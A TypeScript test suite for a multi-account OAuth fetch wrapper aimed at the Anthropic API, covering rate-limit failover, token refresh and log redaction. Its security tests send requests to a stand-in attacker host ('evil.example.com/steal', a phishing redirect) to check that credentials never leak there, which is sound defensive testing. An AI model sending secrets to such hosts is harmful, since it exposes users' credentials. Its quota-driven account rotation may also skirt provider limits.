/**
 * fetch-wrapper.ts — multi-account multiplexing, F1 origin allowlist,
 * F2 body replay, refresh-before-use, classification failover, S5 redaction.
 */
import { afterEach, describe, expect, test } from "bun:test"
import * as fs from "node:fs/promises"
import * as os from "node:os"
import * as path from "node:path"
import type { ProviderAdapter, RefreshResult } from "../adapters/types"
import { ANTHROPIC_API_ORIGINS } from "../adapters/anthropic"
import {
	DEFAULT_COOLDOWN_SECONDS,
	DEFAULT_MAX_COOLDOWN_SECONDS,
	DEFAULT_MAX_REPLAY_BODY_BYTES,
	DEFAULT_REFRESH_SKEW_SECONDS,
	type ProviderConfig,
} from "../config"
import {
	createFetchWrapper,
	PLACEHOLDER_API_KEY,
	redact,
	type FetchLike,
	type Logger,
} from "../fetch-wrapper"
import { _resetRefreshMutexesForTests } from "../refresh"
import { MultiAuthStore, type OAuthAccount } from "../store"

// =============================================================================
// HELPERS
// =============================================================================

const tempDirs: string[] = []
const allLogLines: string[] = []

afterEach(async () => {
	_resetRefreshMutexesForTests()
	while (tempDirs.length > 0) {
		const dir = tempDirs.pop()
		if (dir) await fs.rm(dir, { recursive: true, force: true }).catch(() => {})
	}
})

async function makeTempDir(): Promise<string> {
	const dir = await fs.mkdtemp(path.join(os.tmpdir(), "multi-auth-fw-"))
	tempDirs.push(dir)
	return dir
}

function sampleAccount(overrides: Partial<OAuthAccount> = {}): OAuthAccount {
	return {
		type: "oauth",
		access: "access-token-SECRET-aaa",
		refresh: "refresh-token-SECRET-bbb",
		expires: Date.now() + 3_600_000,
		state: "available",
		resetAt: null,
		addedAt: Date.now(),
		lastUsedAt: null,
		lastExhaustedAt: null,
		...overrides,
	}
}

function defaultProviderConfig(
	overrides: Partial<ProviderConfig> = {},
): ProviderConfig {
	return {
		enabled: true,
		accounts: [
			{ label: "acct1", priority: 1, disabled: false },
			{ label: "acct2", priority: 2, disabled: false },
		],
		defaultCooldownSeconds: DEFAULT_COOLDOWN_SECONDS,
		maxCooldownSeconds: DEFAULT_MAX_COOLDOWN_SECONDS,
		refreshSkewSeconds: DEFAULT_REFRESH_SKEW_SECONDS,
		stickyWithinSession: true,
		failover: {
			maxAttemptsPerRequest: 3,
			retryOn: ["quota", "rate_limit"],
			maxReplayBodyBytes: DEFAULT_MAX_REPLAY_BODY_BYTES,
			notify: "toast",
		},
		...overrides,
	}
}

function capturingLogger(): Logger & { lines: string[] } {
	const lines: string[] = []
	const push = (...args: unknown[]) => {
		const s = args.map(String).join(" ")
		lines.push(s)
		allLogLines.push(s)
	}
	return {
		lines,
		debug: push,
		info: push,
		warn: push,
		error: push,
		log: push,
	}
}

type CapturedRequest = {
	url: string
	method: string
	headers: Record<string, string>
	body: Uint8Array | null
	redirect?: RequestRedirect
}

function headerRecord(h: HeadersInit | undefined): Record<string, string> {
	const out: Record<string, string> = {}
	if (!h) return out
	const headers = new Headers(h)
	for (const [k, v] of headers.entries()) {
		out[k.toLowerCase()] = v
	}
	return out
}

async function captureBody(init?: RequestInit): Promise<Uint8Array | null> {
	if (!init?.body) return null
	if (typeof init.body === "string") {
		return new TextEncoder().encode(init.body)
	}
	if (init.body instanceof Uint8Array) return init.body
	if (init.body instanceof ArrayBuffer) return new Uint8Array(init.body)
	if (typeof Blob !== "undefined" && init.body instanceof Blob) {
		return new Uint8Array(await init.body.arrayBuffer())
	}
	if (typeof ReadableStream !== "undefined" && init.body instanceof ReadableStream) {
		const reader = (init.body as ReadableStream<Uint8Array>).getReader()
		const chunks: Uint8Array[] = []
		let total = 0
		while (true) {
			const { done, value } = await reader.read()
			if (done) break
			if (value) {
				chunks.push(value)
				total += value.byteLength
			}
		}
		const out = new Uint8Array(total)
		let o = 0
		for (const c of chunks) {
			out.set(c, o)
			o += c.byteLength
		}
		return out
	}
	return null
}

function mockAdapter(opts: {
	refresh?: (rt: string) => Promise<RefreshResult>
	apiOrigins?: readonly string[]
} = {}): ProviderAdapter {
	return {
		providerId: "anthropic",
		apiOrigins: opts.apiOrigins ?? ANTHROPIC_API_ORIGINS,
		authorize: async () => ({ type: "failed", reason: "not_used" }),
		refresh:
			opts.refresh ??
			(async () => ({
				outcome: "ok" as const,
				access: "rotated-access-SECRET",
				refresh: "rotated-refresh-SECRET",
				expires: Date.now() + 3_600_000,
			})),
	}
}

function jsonResponse(
	status: number,
	body: unknown,
	headers?: Record<string, string>,
): Response {
	return new Response(JSON.stringify(body), {
		status,
		headers: { "content-type": "application/json", ...headers },
	})
}

function rateLimit429(retryAfterSeconds = 60): Response {
	return jsonResponse(
		429,
		{
			type: "error",
			error: { type: "rate_limit_error", message: "Rate limited" },
		},
		{ "retry-after": String(retryAfterSeconds) },
	)
}

async function setupTwoAccounts(
	cfg?: Partial<ProviderConfig>,
): Promise<{
	store: MultiAuthStore
	providerConfig: ProviderConfig
	baseDir: string
}> {
	const baseDir = await makeTempDir()
	const store = new MultiAuthStore("anthropic", { baseDir })
	await store.upsertAccount(
		"acct1",
		sampleAccount({
			access: "access-acct1-SECRET-111",
			refresh: "refresh-acct1-SECRET-111",
			addedAt: 1000,
		}),
	)
	await store.upsertAccount(
		"acct2",
		sampleAccount({
			access: "access-acct2-SECRET-222",
			refresh: "refresh-acct2-SECRET-222",
			addedAt: 2000,
		}),
	)
	return { store, providerConfig: defaultProviderConfig(cfg), baseDir }
}

// =============================================================================
// redact helper
// =============================================================================

describe("redact", () => {
	test("strips Bearer tokens and placeholder", () => {
		expect(redact("Authorization: Bearer sk-ant-secret-value-here")).toContain(
			"[REDACTED]",
		)
		expect(redact(PLACEHOLDER_API_KEY)).toBe("[REDACTED]")
		expect(redact("Bearer access-token-SECRET-aaa")).not.toContain(
			"access-token-SECRET-aaa",
		)
	})
})

// =============================================================================
// Happy path
// =============================================================================

describe("happy path", () => {
	test("injects Authorization Bearer, single attempt, touches lastUsedAt", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		const captured: CapturedRequest[] = []
		const logger = capturingLogger()

		const fetchImpl: FetchLike = async (input, init) => {
			captured.push({
				url: String(input),
				method: init?.method ?? "GET",
				headers: headerRecord(init?.headers),
				body: await captureBody(init),
				redirect: init?.redirect,
			})
			return jsonResponse(200, { ok: true })
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger,
			fetchImpl,
		})

		const res = await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			headers: {
				"content-type": "application/json",
				"x-api-key": PLACEHOLDER_API_KEY,
				Authorization: `Bearer ${PLACEHOLDER_API_KEY}`,
				"anthropic-version": "2023-06-01",
			},
			body: JSON.stringify({ model: "claude" }),
		})

		expect(res.status).toBe(200)
		expect(captured).toHaveLength(1)
		expect(captured[0]!.headers["authorization"]).toBe(
			"Bearer access-acct1-SECRET-111",
		)
		expect(captured[0]!.headers["x-api-key"]).toBeUndefined()
		expect(captured[0]!.headers["anthropic-version"]).toBe("2023-06-01")
		expect(captured[0]!.redirect).toBe("manual")

		const acct = await store.getAccount("acct1")
		expect(acct?.lastUsedAt).not.toBeNull()
		expect(typeof acct?.lastUsedAt).toBe("number")
	})
})

// =============================================================================
// 429 failover
// =============================================================================

describe("429 failover", () => {
	test("429 on acct1 → fallback → success on acct2; acct1 cooling_down", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		const captured: CapturedRequest[] = []
		const notifications: string[] = []
		const logger = capturingLogger()
		let call = 0

		const fetchImpl: FetchLike = async (input, init) => {
			captured.push({
				url: String(input),
				method: init?.method ?? "GET",
				headers: headerRecord(init?.headers),
				body: await captureBody(init),
				redirect: init?.redirect,
			})
			call += 1
			if (call === 1) return rateLimit429(120)
			return jsonResponse(200, { ok: true })
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger,
			notify: (m) => notifications.push(m),
			fetchImpl,
		})

		const res = await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			body: "{}",
		})

		expect(res.status).toBe(200)
		expect(captured).toHaveLength(2)
		expect(captured[0]!.headers["authorization"]).toBe(
			"Bearer access-acct1-SECRET-111",
		)
		expect(captured[1]!.headers["authorization"]).toBe(
			"Bearer access-acct2-SECRET-222",
		)

		const a1 = await store.getAccount("acct1")
		expect(a1?.state).toBe("cooling_down")
		expect(a1?.resetAt).not.toBeNull()
		expect(a1?.lastExhaustedAt).not.toBeNull()

		const a2 = await store.getAccount("acct2")
		expect(a2?.lastUsedAt).not.toBeNull()
		expect(a2?.state).toBe("available")
	})

	test("all exhausted → 429 surfaced + notify with earliest reset, no tokens", async () => {
		const { store, providerConfig } = await setupTwoAccounts({
			failover: {
				maxAttemptsPerRequest: 3,
				retryOn: ["quota", "rate_limit"],
				maxReplayBodyBytes: DEFAULT_MAX_REPLAY_BODY_BYTES,
				notify: "toast",
			},
		})
		const notifications: string[] = []
		const logger = capturingLogger()

		const fetchImpl: FetchLike = async () => rateLimit429(90)

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger,
			notify: (m) => notifications.push(m),
			fetchImpl,
		})

		const res = await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			body: "{}",
		})

		expect(res.status).toBe(429)

		const a1 = await store.getAccount("acct1")
		const a2 = await store.getAccount("acct2")
		expect(a1?.state).toBe("cooling_down")
		expect(a2?.state).toBe("cooling_down")

		const allNotify = notifications.join("\n")
		expect(allNotify.toLowerCase()).toContain("exhausted")
		expect(allNotify).toMatch(/reset/i)
		// No raw tokens in notify
		expect(allNotify).not.toContain("access-acct1-SECRET-111")
		expect(allNotify).not.toContain("refresh-acct1-SECRET-111")
		expect(allNotify).not.toContain("access-acct2-SECRET-222")
		expect(allNotify).not.toContain("Bearer access-")
	})
})

// =============================================================================
// Transient 5xx — no failover
// =============================================================================

describe("transient 5xx", () => {
	test("500 passed through, no fallback, account NOT cooling_down", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		const captured: CapturedRequest[] = []
		const logger = capturingLogger()

		const fetchImpl: FetchLike = async (input, init) => {
			captured.push({
				url: String(input),
				method: init?.method ?? "GET",
				headers: headerRecord(init?.headers),
				body: await captureBody(init),
			})
			return jsonResponse(500, {
				type: "error",
				error: { type: "api_error", message: "boom" },
			})
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger,
			fetchImpl,
		})

		const res = await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			body: "{}",
		})

		expect(res.status).toBe(500)
		expect(captured).toHaveLength(1)

		const a1 = await store.getAccount("acct1")
		expect(a1?.state).toBe("available")
		expect(a1?.lastExhaustedAt).toBeNull()
	})

	test("529 overloaded passed through without cooling_down", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		let calls = 0
		const fetchImpl: FetchLike = async () => {
			calls += 1
			return jsonResponse(529, {
				type: "error",
				error: { type: "overloaded_error", message: "Overloaded" },
			})
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger: capturingLogger(),
			fetchImpl,
		})

		const res = await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			body: "{}",
		})
		expect(res.status).toBe(529)
		expect(calls).toBe(1)
		expect((await store.getAccount("acct1"))?.state).toBe("available")
	})
})

// =============================================================================
// Expired token → refresh before dispatch
// =============================================================================

describe("token refresh", () => {
	test("expired token → refresh called before dispatch; rotated token persisted before use", async () => {
		const baseDir = await makeTempDir()
		const store = new MultiAuthStore("anthropic", { baseDir })
		const oldAccess = "old-access-SECRET-zzz"
		const oldRefresh = "old-refresh-SECRET-zzz"
		const newAccess = "new-access-SECRET-yyy"
		const newRefresh = "new-refresh-SECRET-yyy"

		await store.upsertAccount(
			"acct1",
			sampleAccount({
				access: oldAccess,
				refresh: oldRefresh,
				expires: Date.now() - 1000, // already expired
			}),
		)

		const providerConfig = defaultProviderConfig({
			accounts: [{ label: "acct1", priority: 1, disabled: false }],
		})

		const order: string[] = []
		let refreshCalls = 0
		const capturedAuth: string[] = []

		const adapter = mockAdapter({
			refresh: async (rt) => {
				refreshCalls += 1
				order.push("refresh")
				expect(rt).toBe(oldRefresh)
				// Persist happens inside refreshAccount before return — verify store later
				return {
					outcome: "ok",
					access: newAccess,
					refresh: newRefresh,
					expires: Date.now() + 3_600_000,
				}
			},
		})

		const fetchImpl: FetchLike = async (_input, init) => {
			order.push("dispatch")
			const h = headerRecord(init?.headers)
			capturedAuth.push(h["authorization"] ?? "")
			// Rotated token must already be in store before dispatch
			const acct = await store.getAccount("acct1")
			expect(acct?.access).toBe(newAccess)
			expect(acct?.refresh).toBe(newRefresh)
			return jsonResponse(200, { ok: true })
		}

		const fetch = createFetchWrapper({
			store,
			adapter,
			providerConfig,
			logger: capturingLogger(),
			fetchImpl,
		})

		const res = await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			body: "{}",
		})

		expect(res.status).toBe(200)
		expect(refreshCalls).toBe(1)
		expect(order[0]).toBe("refresh")
		expect(order[1]).toBe("dispatch")
		expect(capturedAuth[0]).toBe(`Bearer ${newAccess}`)
		expect(capturedAuth[0]).not.toContain(oldAccess)
	})
})

// =============================================================================
// F1 — origin allowlist / placeholder / redirects
// =============================================================================

describe("F1 security", () => {
	test("sentinel placeholder never present in outgoing headers", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		const captured: CapturedRequest[] = []

		const fetchImpl: FetchLike = async (_input, init) => {
			captured.push({
				url: "",
				method: "POST",
				headers: headerRecord(init?.headers),
				body: null,
			})
			return jsonResponse(200, {})
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger: capturingLogger(),
			fetchImpl,
		})

		await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			headers: {
				"x-api-key": PLACEHOLDER_API_KEY,
				Authorization: `Bearer ${PLACEHOLDER_API_KEY}`,
				"x-custom": PLACEHOLDER_API_KEY,
			},
			body: "{}",
		})

		const allHeaderValues = Object.values(captured[0]!.headers).join(" ")
		expect(allHeaderValues).not.toContain(PLACEHOLDER_API_KEY)
		expect(captured[0]!.headers["x-api-key"]).toBeUndefined()
		expect(captured[0]!.headers["x-custom"]).toBeUndefined()
		expect(captured[0]!.headers["authorization"]).toMatch(/^Bearer access-/)
	})

	test("non-allowlisted origin receives NO Authorization and no x-api-key", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		const captured: CapturedRequest[] = []

		const fetchImpl: FetchLike = async (input, init) => {
			captured.push({
				url: String(input),
				method: init?.method ?? "GET",
				headers: headerRecord(init?.headers),
				body: await captureBody(init),
			})
			return jsonResponse(200, { ok: true })
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger: capturingLogger(),
			fetchImpl,
		})

		const res = await fetch("https://evil.example.com/steal", {
			method: "POST",
			headers: {
				"x-api-key": PLACEHOLDER_API_KEY,
				Authorization: `Bearer ${PLACEHOLDER_API_KEY}`,
				"content-type": "application/json",
			},
			body: JSON.stringify({ leak: true }),
		})

		expect(res.status).toBe(200)
		expect(captured).toHaveLength(1)
		expect(captured[0]!.headers["authorization"]).toBeUndefined()
		expect(captured[0]!.headers["x-api-key"]).toBeUndefined()
		// Only one call — no multi-auth fallback loop
		expect(captured[0]!.url).toContain("evil.example.com")
	})

	test("providerConfig containing extra origin keys has no effect (allowlist frozen)", async () => {
		const { store } = await setupTwoAccounts()
		// Even if someone smuggles apiOrigins onto config object, wrapper must ignore it
		const providerConfig = defaultProviderConfig() as ProviderConfig & {
			apiOrigins?: string[]
			allowedOrigins?: string[]
		}
		providerConfig.apiOrigins = ["https://evil.example.com", "https://api.anthropic.com"]
		providerConfig.allowedOrigins = ["https://evil.example.com"]

		const captured: CapturedRequest[] = []
		const fetchImpl: FetchLike = async (input, init) => {
			captured.push({
				url: String(input),
				method: "POST",
				headers: headerRecord(init?.headers),
				body: null,
			})
			return jsonResponse(200, {})
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(), // frozen ANTHROPIC_API_ORIGINS only
			providerConfig,
			logger: capturingLogger(),
			fetchImpl,
		})

		await fetch("https://evil.example.com/x", {
			method: "POST",
			headers: { Authorization: "Bearer access-acct1-SECRET-111" },
			body: "{}",
		})

		expect(captured[0]!.headers["authorization"]).toBeUndefined()
	})

	test("3xx on credentialed request → error, fetchImpl called with redirect:manual", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		const captured: CapturedRequest[] = []

		const fetchImpl: FetchLike = async (_input, init) => {
			captured.push({
				url: "",
				method: "POST",
				headers: headerRecord(init?.headers),
				body: null,
				redirect: init?.redirect,
			})
			return new Response(null, {
				status: 302,
				headers: { location: "https://evil.example.com/phish" },
			})
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger: capturingLogger(),
			fetchImpl,
		})

		await expect(
			fetch("https://api.anthropic.com/v1/messages", {
				method: "POST",
				body: "{}",
			}),
		).rejects.toThrow(/redirect/i)

		expect(captured).toHaveLength(1)
		expect(captured[0]!.redirect).toBe("manual")
		// Must not have followed to evil host
		expect(captured[0]!.headers["authorization"]).toMatch(/^Bearer /)
	})
})

// =============================================================================
// F2 — body replay
// =============================================================================

describe("F2 body replay", () => {
	test("fallback replays byte-identical body", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		const bodies: Uint8Array[] = []
		const payload = new TextEncoder().encode(
			JSON.stringify({ model: "claude-3", messages: [{ role: "user", content: "hi" }] }),
		)

		let call = 0
		const fetchImpl: FetchLike = async (_input, init) => {
			const b = await captureBody(init)
			if (b) bodies.push(b)
			call += 1
			if (call === 1) return rateLimit429(30)
			return jsonResponse(200, { ok: true })
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger: capturingLogger(),
			fetchImpl,
		})

		await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			headers: { "content-type": "application/json" },
			body: payload,
		})

		expect(bodies).toHaveLength(2)
		expect(bodies[0]!).toEqual(payload)
		expect(bodies[1]!).toEqual(payload)
		// byte-identical across attempts
		expect(Buffer.from(bodies[0]!).equals(Buffer.from(bodies[1]!))).toBe(true)
	})

	test("body > maxReplayBodyBytes → exactly one attempt, exhaustion still recorded", async () => {
		const maxBytes = 64
		const { store, providerConfig } = await setupTwoAccounts({
			failover: {
				maxAttemptsPerRequest: 3,
				retryOn: ["quota", "rate_limit"],
				maxReplayBodyBytes: maxBytes,
				notify: "toast",
			},
		})

		const big = new Uint8Array(maxBytes + 10).fill(65)
		let calls = 0
		const fetchImpl: FetchLike = async () => {
			calls += 1
			return rateLimit429(60)
		}

		const logger = capturingLogger()
		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger,
			fetchImpl,
		})

		const res = await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			body: big,
		})

		expect(res.status).toBe(429)
		expect(calls).toBe(1)

		const a1 = await store.getAccount("acct1")
		expect(a1?.state).toBe("cooling_down")
		expect(a1?.lastExhaustedAt).not.toBeNull()

		// single-attempt logged
		expect(logger.lines.some((l) => /single-attempt/i.test(l))).toBe(true)
	})

	test("non-replayable stream body → single attempt", async () => {
		const { store, providerConfig } = await setupTwoAccounts()
		let calls = 0
		const fetchImpl: FetchLike = async () => {
			calls += 1
			return rateLimit429(60)
		}

		// A stream that errors on read → non-replayable
		const badStream = new ReadableStream<Uint8Array>({
			pull() {
				throw new Error("stream broken")
			},
		})

		const logger = capturingLogger()
		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger,
			fetchImpl,
		})

		const res = await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			body: badStream,
		})

		expect(res.status).toBe(429)
		expect(calls).toBe(1)
		expect(logger.lines.some((l) => /single-attempt/i.test(l))).toBe(true)

		const a1 = await store.getAccount("acct1")
		expect(a1?.state).toBe("cooling_down")
	})
})

// =============================================================================
// Redaction across suite logs
// =============================================================================

describe("S5 redaction", () => {
	test("logger output never contains access/refresh token substrings", async () => {
		// Run a multi-path scenario that exercises logging
		const { store, providerConfig } = await setupTwoAccounts()
		const logger = capturingLogger()
		const tokens = [
			"access-acct1-SECRET-111",
			"refresh-acct1-SECRET-111",
			"access-acct2-SECRET-222",
			"refresh-acct2-SECRET-222",
		]

		let call = 0
		const fetchImpl: FetchLike = async () => {
			call += 1
			if (call === 1) return rateLimit429(10)
			return jsonResponse(200, { ok: true })
		}

		const fetch = createFetchWrapper({
			store,
			adapter: mockAdapter(),
			providerConfig,
			logger,
			notify: (m) => logger.info(m),
			fetchImpl,
		})

		await fetch("https://api.anthropic.com/v1/messages", {
			method: "POST",
			headers: {
				Authorization: `Bearer ${PLACEHOLDER_API_KEY}`,
				"x-api-key": PLACEHOLDER_API_KEY,
			},
			body: JSON.stringify({ secret: "not-a-token-in-body-ok" }),
		})

		const blob = logger.lines.join("\n")
		for (const t of tokens) {
			expect(blob).not.toContain(t)
		}
		expect(blob).not.toContain(PLACEHOLDER_API_KEY)
		expect(blob).not.toMatch(/Bearer\s+access-/)
	})
})

// =============================================================================
// Suite-wide: no secrets in any captured log line from this file
// =============================================================================

describe("suite log hygiene", () => {
	test("allLogLines contain no known secret substrings from this suite", () => {
		const secrets = [
			"access-acct1-SECRET-111",
			"refresh-acct1-SECRET-111",
			"access-acct2-SECRET-222",
			"refresh-acct2-SECRET-222",
			"old-access-SECRET-zzz",
			"old-refresh-SECRET-zzz",
			"new-access-SECRET-yyy",
			"new-refresh-SECRET-yyy",
			"access-token-SECRET-aaa",
			"refresh-token-SECRET-bbb",
			"rotated-access-SECRET",
			"rotated-refresh-SECRET",
		]
		const blob = allLogLines.join("\n")
		for (const s of secrets) {
			expect(blob).not.toContain(s)
		}
	})
})
